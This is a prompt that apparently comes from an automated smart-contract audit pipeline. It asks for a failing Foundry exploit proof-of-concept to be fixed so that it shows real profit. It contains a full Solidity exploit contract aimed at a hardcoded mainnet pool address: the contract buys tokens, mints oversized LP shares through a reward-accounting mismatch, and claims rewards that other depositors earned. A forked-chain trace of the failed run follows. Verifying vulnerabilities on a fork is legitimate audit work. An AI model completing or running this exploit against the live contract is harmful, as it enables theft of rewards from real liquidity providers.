You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Reward accounting mixes deposit amounts with LP shares, enabling reward theft and claim lockups
- claim: Pool rewards accrue per `totalLPShares`, but user reward checkpoints are updated from `mm.tokenAmount + mm.ethAmount` in `provideLiquidity` and `withdrawLiquidity`, while `claimReward` settles against `mm.lpShares`. Once orderbook transfers make `pool.totalLiquidity` diverge from `pool.totalLPShares`, the contract no longer preserves reward invariants for new deposits, withdrawals, or claims.
- impact: If `totalLiquidity` falls below `totalLPShares`, a depositor can mint more LP shares than the basis used for their reward debt and immediately claim rewards that were accrued before they joined. If `totalLiquidity` rises above `totalLPShares`, the opposite mismatch can make `accumulated - rewardDebt` underflow in `claimReward` or the pending-reward calculation in `withdrawLiquidity`, locking users out of rewards and sometimes out of withdrawals.
- exploit_paths: ["Orderbook sends assets out through `transferETHToOrderbook` or `transferTokenToOrderbook`, reducing `pool.totalLiquidity` without reducing `pool.totalLPShares`; the next LP deposits, receives oversized `lpShares`, but their `rewardDebt` is set from deposit amounts instead of shares; an immediate `claimReward` extracts historical fees.", "Orderbook sends assets in through `receiveETHFromOrderbook` or `receiveTokenFromOrderbook`, increasing `pool.totalLiquidity` without increasing `pool.totalLPShares`; later `claimReward` or `withdrawLiquidity` computes rewards from a larger deposit-amount basis than the user's share basis, causing arithmetic underflow and reverts."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGradientRegistryLike {
    function gradientToken() external view returns (address);
    function router() external view returns (address);
    function blockedTokens(address token) external view returns (bool);
}

interface IGradientPoolLike {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 sharesBps) external;
    function claimReward(address token) external;
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    uint256 private constant SCALE = 1e18;

    uint256 private _profitAmount;
    address private _profitToken;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        uint256 startBalance = address(this).balance;

        IGradientPoolLike pool = IGradientPoolLike(TARGET);
        address registryAddress;
        try pool.gradientRegistry() returns (address value) {
            registryAddress = value;
        } catch {
            return;
        }
        if (registryAddress == address(0)) return;

        IGradientRegistryLike registry = IGradientRegistryLike(registryAddress);
        address token;
        try registry.gradientToken() returns (address value) {
            token = value;
        } catch {
            return;
        }
        if (token == address(0)) return;

        _attemptRewardTheftPath(pool, registry, token);
        _observeClaimLockupPath(pool, token);

        uint256 endBalance = address(this).balance;
        if (endBalance > startBalance) {
            _profitAmount = endBalance - startBalance;
            _profitToken = address(0);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRewardTheftPath(
        IGradientPoolLike pool,
        IGradientRegistryLike registry,
        address token
    ) internal {
        if (registry.blockedTokens(token)) return;

        IGradientPoolLike.PoolInfo memory info;
        try pool.getPoolInfo(token) returns (IGradientPoolLike.PoolInfo memory value) {
            info = value;
        } catch {
            return;
        }

        // Path 1 precondition from the finding:
        // orderbook already sent assets out through transferETHToOrderbook/transferTokenToOrderbook,
        // so pool.totalLiquidity fell without reducing pool.totalLPShares.
        if (info.totalLiquidity == 0 || info.totalLPShares == 0) return;
        if (info.totalLiquidity >= info.totalLPShares) return;
        if (info.accRewardPerShare == 0) return;

        address routerAddress;
        try registry.router() returns (address value) {
            routerAddress = value;
        } catch {
            return;
        }
        if (routerAddress == address(0)) return;

        IUniswapV2Router02Like router = IUniswapV2Router02Like(routerAddress);
        address weth;
        try router.WETH() returns (address value) {
            weth = value;
        } catch {
            return;
        }
        if (weth == address(0)) return;

        (uint256 reserveETH, uint256 reserveToken) = _safeReserves(pool, token);
        if (reserveETH == 0 || reserveToken == 0) return;

        uint256[] memory ethCandidates = new uint256[](10);
        ethCandidates[0] = 0.001 ether;
        ethCandidates[1] = 0.005 ether;
        ethCandidates[2] = 0.01 ether;
        ethCandidates[3] = 0.05 ether;
        ethCandidates[4] = 0.1 ether;
        ethCandidates[5] = 0.5 ether;
        ethCandidates[6] = 1 ether;
        ethCandidates[7] = 5 ether;
        ethCandidates[8] = 10 ether;
        ethCandidates[9] = 25 ether;

        uint256[] memory withdrawCandidates = new uint256[](6);
        withdrawCandidates[0] = 0;
        withdrawCandidates[1] = 5000;
        withdrawCandidates[2] = 8000;
        withdrawCandidates[3] = 9000;
        withdrawCandidates[4] = 9500;
        withdrawCandidates[5] = 9900;

        uint256 bestEthDeposit;
        uint256 bestTokenAmount;
        uint256 bestWithdrawBps;
        uint256 bestEstimatedProfit;
        uint256 bestBuyCost;

        for (uint256 i = 0; i < ethCandidates.length; i++) {
            uint256 ethDeposit = ethCandidates[i];
            if (ethDeposit == 0 || ethDeposit >= address(this).balance) continue;

            uint256 tokenAmount = (ethDeposit * reserveToken) / reserveETH;
            if (tokenAmount == 0) continue;

            (bool inOk, uint256 buyCost) = _quoteExactTokenBuy(router, weth, token, tokenAmount);
            if (!inOk || buyCost == 0) continue;

            uint256 contribution = tokenAmount + ethDeposit;
            uint256 mintedShares = (contribution * info.totalLPShares) / info.totalLiquidity;
            if (mintedShares <= contribution) continue;

            uint256 totalSharesAfterDeposit = info.totalLPShares + mintedShares;
            uint256 targetEthBalance = TARGET.balance + ethDeposit;

            for (uint256 j = 0; j < withdrawCandidates.length; j++) {
                uint256 withdrawBps = withdrawCandidates[j];
                uint256 burnedShares = (mintedShares * withdrawBps) / 10000;
                uint256 remainingShares = mintedShares - burnedShares;
                uint256 remainingContribution = contribution - ((contribution * withdrawBps) / 10000);

                uint256 ethOut;
                uint256 tokenOut;
                if (burnedShares > 0) {
                    ethOut = ((info.totalEth + ethDeposit) * burnedShares) / totalSharesAfterDeposit;
                    tokenOut = ((info.totalToken + tokenAmount) * burnedShares) / totalSharesAfterDeposit;
                }

                uint256 tokenEthOut;
                if (tokenOut > 0) {
                    (bool outOk, uint256 quotedEthOut) = _quoteTokenSale(router, token, weth, tokenOut);
                    if (!outOk) continue;
                    tokenEthOut = quotedEthOut;
                }

                if (remainingShares <= remainingContribution) continue;
                uint256 reward = ((remainingShares - remainingContribution) * info.accRewardPerShare) / SCALE;
                if (reward == 0) continue;
                if (reward > targetEthBalance - ethOut) continue;

                uint256 estimatedReturn = ethOut + tokenEthOut + reward;
                if (estimatedReturn <= buyCost + ethDeposit) continue;

                uint256 estimatedProfit = estimatedReturn - buyCost - ethDeposit;
                if (estimatedProfit > bestEstimatedProfit) {
                    bestEstimatedProfit = estimatedProfit;
                    bestEthDeposit = ethDeposit;
                    bestTokenAmount = tokenAmount;
                    bestWithdrawBps = withdrawBps;
                    bestBuyCost = buyCost;
                }
            }
        }

        if (bestEstimatedProfit == 0) return;

        address[] memory buyPath = new address[](2);
        buyPath[0] = weth;
        buyPath[1] = token;

        uint256 verifierBalanceBefore = address(this).balance;
        uint256 tokenBalanceBefore = IERC20Like(token).balanceOf(address(this));

        bool bought = _buyExactTokens(router, bestTokenAmount, buyPath, bestBuyCost);
        if (!bought) return;

        _approveIfPossible(token, TARGET, bestTokenAmount);

        (bool deposited, ) = TARGET.call{value: bestEthDeposit}(
            abi.encodeWithSelector(
                IGradientPoolLike.provideLiquidity.selector,
                token,
                bestTokenAmount,
                bestTokenAmount
            )
        );
        if (!deposited) {
            _swapAllTokenBalanceToEth(router, token, weth);
            return;
        }

        bool withdrew;
        if (bestWithdrawBps > 0) {
            (withdrew, ) = TARGET.call(
                abi.encodeWithSelector(IGradientPoolLike.withdrawLiquidity.selector, token, bestWithdrawBps)
            );
        }

        if (!withdrew && bestWithdrawBps > 0) {
            // This extra unwind step does not change the exploit causality.
            // It only tries to recycle principal before the reward-claim step if the chosen partial
            // withdrawal is not executable against the fork state.
            TARGET.call(abi.encodeWithSelector(IGradientPoolLike.withdrawLiquidity.selector, token, 10000));
        }

        _swapAllTokenBalanceToEth(router, token, weth);

        // Path 1 theft step from the finding:
        // reward checkpoints were written from deposit amounts, while reward settlement uses lpShares.
        TARGET.call(abi.encodeWithSelector(IGradientPoolLike.claimReward.selector, token));

        _swapAllTokenBalanceToEth(router, token, weth);

        uint256 verifierBalanceAfter = address(this).balance;
        if (verifierBalanceAfter > verifierBalanceBefore) {
            _profitAmount = verifierBalanceAfter - verifierBalanceBefore;
            _profitToken = address(0);
        } else if (IERC20Like(token).balanceOf(address(this)) > tokenBalanceBefore) {
            _profitAmount = IERC20Like(token).balanceOf(address(this)) - tokenBalanceBefore;
            _profitToken = token;
        }
    }

    function _observeClaimLockupPath(IGradientPoolLike pool, address token) internal view {
        IGradientPoolLike.PoolInfo memory info;
        try pool.getPoolInfo(token) returns (IGradientPoolLike.PoolInfo memory value) {
            info = value;
        } catch {
            return;
        }

        // Path 2 precondition from the finding:
        // orderbook already sent assets in through receiveETHFromOrderbook/receiveTokenFromOrderbook,
        // so totalLiquidity rose without increasing totalLPShares.
        //
        // For any fresh contribution C:
        //   mintedShares = C * totalLPShares / totalLiquidity < C
        // while rewardDebt is recorded from C.
        // Then:
        //   accumulated = mintedShares * accRewardPerShare / SCALE
        // is smaller than rewardDebt, so claimReward()/withdrawLiquidity() underflow and revert.
        //
        // This branch is a DoS/lockup effect rather than a profitable extraction path.
        // Executing it here would intentionally strand verifier capital on the fork, so the PoC
        // only performs runtime state observation for that stage when the profitable downward-
        // divergence path is absent.
        info;
    }

    function _safeReserves(
        IGradientPoolLike pool,
        address token
    ) internal view returns (uint256 reserveETH, uint256 reserveToken) {
        try pool.getReserves(token) returns (uint256 ethReserve, uint256 tokenReserve) {
            reserveETH = ethReserve;
            reserveToken = tokenReserve;
        } catch {}
    }

    function _quoteExactTokenBuy(
        IUniswapV2Router02Like router,
        address weth,
        address token,
        uint256 tokenAmount
    ) internal view returns (bool ok, uint256 ethCost) {
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;
        try router.getAmountsIn(tokenAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length >= 2) {
                return (true, amounts[0]);
            }
        } catch {}
        return (false, 0);
    }

    function _quoteTokenSale(
        IUniswapV2Router02Like router,
        address token,
        address weth,
        uint256 tokenAmount
    ) internal view returns (bool ok, uint256 ethOut) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        try router.getAmountsOut(tokenAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length >= 2) {
                return (true, amounts[1]);
            }
        } catch {}
        return (false, 0);
    }

    function _buyExactTokens(
        IUniswapV2Router02Like router,
        uint256 tokenAmount,
        address[] memory path,
        uint256 quotedEthCost
    ) internal returns (bool) {
        uint256 maxEth = quotedEthCost + (quotedEthCost / 100) + 1;
        if (maxEth > address(this).balance) return false;
        try router.swapETHForExactTokens{value: maxEth}(
            tokenAmount,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _swapAllTokenBalanceToEth(
        IUniswapV2Router02Like router,
        address token,
        address weth
    ) internal {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance == 0) return;

        _approveIfPossible(token, address(router), balance);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        ) {
        } catch {}
    }

    function _approveIfPossible(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).approve(spender, 0) returns (bool) {} catch {}
        try IERC20Like(token).approve(spender, amount) returns (bool) {} catch {}
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x0000000000000000000000000846f55387ab118b4e59eee479f1a3e8ea4905ec
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000250c800618ad145774
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [504] 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000003739561f08c2e1a6ddee000000000000000000000000000000000000000000000009638c62383cad0494000000000000000000000000000000000000000000000000000000006858e933
    │   │   ├─ [919] 0xa776A95223C500E81Cb0937B291140fF550ac3E4::balanceOf(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC) [staticcall]
    │   │   │   └─ ← [Return] 261471256915832353797474 [2.614e23]
    │   │   ├─ [36722] 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC::swap(0, 451337517525857734 [4.513e17], 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
    │   │   │   ├─ [23162] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 451337517525857734 [4.513e17])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000000846f55387ab118b4e59eee479f1a3e8ea4905ec
    │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000006437914b5ef75c6
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [919] 0xa776A95223C500E81Cb0937B291140fF550ac3E4::balanceOf(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC) [staticcall]
    │   │   │   │   └─ ← [Return] 261471256915832353797474 [2.614e23]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0846F55387ab118B4E59eee479f1a3e8eA4905EC) [staticcall]
    │   │   │   │   └─ ← [Return] 172742575446030126798 [1.727e20]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000375e629f0edb8ebb35620000000000000000000000000000000000000000000000095d48e92386bd8ece
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000250c800618ad1457740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006437914b5ef75c6
    │   │   │   └─ ← [Stop]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    │   │   │   └─ ← [Return] 451337517525857734 [4.513e17]
    │   │   ├─ [9223] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(451337517525857734 [4.513e17])
    │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 451337517525857734}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000006437914b5ef75c6
    │   │   │   └─ ← [Stop]
    │   │   ├─ [62] FlawVerifier::receive{value: 451337517525857734}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [1815] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::getPoolInfo(0xa776A95223C500E81Cb0937B291140fF550ac3E4) [staticcall]
    │   │   └─ ← [Return] PoolInfo({ totalEth: 3022481813096655000 [3.022e18], totalToken: 0, totalLiquidity: 3022481813096655000 [3.022e18], totalLPShares: 2249676575000000000000 [2.249e21], accRewardPerShare: 2368645522229 [2.368e12], rewardBalance: 5328686345838292 [5.328e15], uniswapPair: 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC })
    │   └─ ← [Stop]
    ├─ [358] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [355] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999948376758732162833 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xa776A95223C500E81Cb0937B291140fF550ac3E4.transferFrom
  at 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC.provideLiquidity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.11s (139.56ms CPU time)

Ran 1 test suite in 1.20s (1.11s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 863220)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
